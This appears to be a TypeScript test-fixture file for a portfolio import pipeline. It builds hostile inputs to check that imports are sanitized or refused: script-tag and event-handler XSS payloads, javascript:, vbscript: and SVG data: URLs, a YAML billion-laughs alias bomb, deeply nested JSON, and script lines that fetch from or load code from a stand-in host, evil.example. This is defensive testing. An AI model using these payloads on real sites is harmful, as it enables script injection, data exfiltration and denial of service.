import { readFileSync } from 'node:fs';
import { parseSource, serialize } from '@portfolio/schema';
import type { ImportInput, ImportRefusal } from '../pipeline';

// For tests: the import's hostile fixtures (#9, A8 and A9), built from the
// bundled example pair, for pipeline.test.ts and the browser spec
// (tests/e2e/demo-import.spec.ts) alike. Every fixture carries CANARY in the
// values it plants, and in its file names, so a test can look for it in
// whatever the import returns, logs, or sends.

/** A value no document or message has by chance. */
export const CANARY = 'kgn-import-canary-7f3a9c';

const ROOT = new URL('../../../../../../../', import.meta.url);

export const EXAMPLE = {
  portfolio: readFileSync(new URL('portfolio.example.yml', ROOT), 'utf8'),
  site: readFileSync(new URL('site.example.yml', ROOT), 'utf8'),
} as const;

export interface HostileFixture {
  readonly name: string;
  readonly files: readonly ImportInput[];
  /** `imported` when the pair is valid and renders inert, else the refusal. */
  readonly expect: 'imported' | ImportRefusal;
}

type Data = Record<string, unknown>;

export function bytes(text: string): Uint8Array {
  return new TextEncoder().encode(text);
}

/** The example's data, to change and write out again. */
export function exampleData(document: 'portfolio' | 'site'): Data {
  const parsed = parseSource(EXAMPLE[document], 'yaml');
  if (!parsed.ok) throw new Error(`The example ${document} document doesn't parse.`);
  return structuredClone(parsed.data) as Data;
}

/** A pair as files, named with the canary so nothing may read the names. */
export function pairFiles(portfolio: string, site: string = EXAMPLE.site): readonly ImportInput[] {
  return [
    { name: `${CANARY}-portfolio.yml`, bytes: bytes(portfolio) },
    { name: `${CANARY}-site.txt`, bytes: bytes(site) },
  ];
}

/** The example portfolio with `change` applied, written as YAML. */
export function portfolioWith(change: (data: Data) => void): string {
  const data = exampleData('portfolio');
  change(data);
  return serialize(data, 'yaml');
}

type Work = { summary?: string; description?: string };

/** Markdown in the practice's thesis and the first work's summary and description. */
function markdown(thesis: string, summary: string, description: string): string {
  return portfolioWith((data) => {
    (data.practice as Data).thesis = thesis;
    const [work] = data.works as Work[];
    work!.summary = summary;
    work!.description = description;
  });
}

const SVG = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert('${CANARY}')"><script>alert('${CANARY}')</script></svg>`;
const SVG_BASE64 = Buffer.from(SVG).toString('base64');

function billionLaughs(): string {
  const lines = [
    'schemaVersion: 3',
    'locale: en',
    'direction: ltr',
    `identity: { name: ${CANARY} }`,
  ];
  lines.push(`l0: &l0 [${Array(9).fill(`"${CANARY}"`).join(', ')}]`);
  for (let level = 1; level <= 9; level++) {
    lines.push(
      `l${level}: &l${level} [${Array(9)
        .fill(`*l${level - 1}`)
        .join(', ')}]`,
    );
  }
  return `${lines.join('\n')}\n`;
}

function deepJson(): string {
  const depth = 200;
  return `{"schemaVersion":3,"identity":{"name":"${CANARY}"},"deep":${'['.repeat(depth)}"${CANARY}"${']'.repeat(depth)}}`;
}

export const HOSTILE_FIXTURES: readonly HostileFixture[] = [
  {
    name: 'script tags in Markdown and plain text',
    expect: 'imported',
    files: pairFiles(
      portfolioWith((data) => {
        (data.practice as Data).thesis = `Before <script>alert('${CANARY}')</script> after.`;
        const [work] = data.works as Work[];
        work!.summary = `<SCRIPT src="https://evil.example/${CANARY}.js"></SCRIPT>`;
        work!.description = `<script>\nfetch('https://evil.example/?${CANARY}')\n</script>`;
        (data.identity as Data).tagline = `<script>alert('${CANARY}')</script>`;
      }),
    ),
  },
  {
    name: 'event-handler attributes in Markdown',
    expect: 'imported',
    files: pairFiles(
      markdown(
        `<img src=x onerror="alert('${CANARY}')">`,
        `<a href="https://example.com" onmouseover="alert('${CANARY}')">hover</a>`,
        `<p onclick="alert('${CANARY}')" style="background:url(javascript:alert(1))">tap</p>\n\n<details open ontoggle="alert('${CANARY}')">x</details>`,
      ),
    ),
  },
  {
    name: 'javascript: and non-image data: links in Markdown',
    expect: 'imported',
    files: pairFiles(
      markdown(
        `[one](javascript:alert('${CANARY}')) and [two](JaVaScRiPt:alert(1)) and <javascript:alert('${CANARY}')>`,
        `[three](data:text/html;base64,${Buffer.from(`<script>${CANARY}</script>`).toString('base64')})`,
        `[four](java&#x09;script:alert('${CANARY}')) and [five][ref]\n\n[ref]: vbscript:msgbox('${CANARY}')`,
      ),
    ),
  },
  {
    name: 'SVG payloads in Markdown',
    expect: 'imported',
    files: pairFiles(
      markdown(
        SVG,
        `![logo](data:image/svg+xml;base64,${SVG_BASE64})`,
        `[svg](data:image/svg+xml;base64,${SVG_BASE64})\n\n<math><mi xlink:href="javascript:alert('${CANARY}')">x</mi></math>`,
      ),
    ),
  },
  {
    name: 'a javascript: URL in a link field',
    expect: 'invalid',
    files: pairFiles(
      portfolioWith((data) => {
        (data.links as Data[])[0]!.url = `javascript:alert('${CANARY}')`;
      }),
    ),
  },
  {
    name: 'a non-image data: URL in a link field',
    expect: 'invalid',
    files: pairFiles(
      portfolioWith((data) => {
        (data.links as Data[])[0]!.url = `data:text/html,<script>alert('${CANARY}')</script>`;
      }),
    ),
  },
  {
    name: 'an SVG data: URL as an image source',
    expect: 'invalid',
    files: pairFiles(
      portfolioWith((data) => {
        (data.media as Data[])[0]!.source = `data:image/svg+xml;base64,${SVG_BASE64}`;
      }),
    ),
  },
  {
    name: 'a remote SVG image',
    expect: 'imported',
    files: pairFiles(
      portfolioWith((data) => {
        (data.media as Data[])[0]!.source = `https://images.example.net/${CANARY}.svg`;
      }),
    ),
  },
  {
    name: 'a YAML alias bomb',
    expect: 'parse_limits',
    files: pairFiles(billionLaughs()),
  },
  {
    name: 'JSON nested past the limit',
    expect: 'parse_limits',
    files: pairFiles(deepJson()),
  },
];
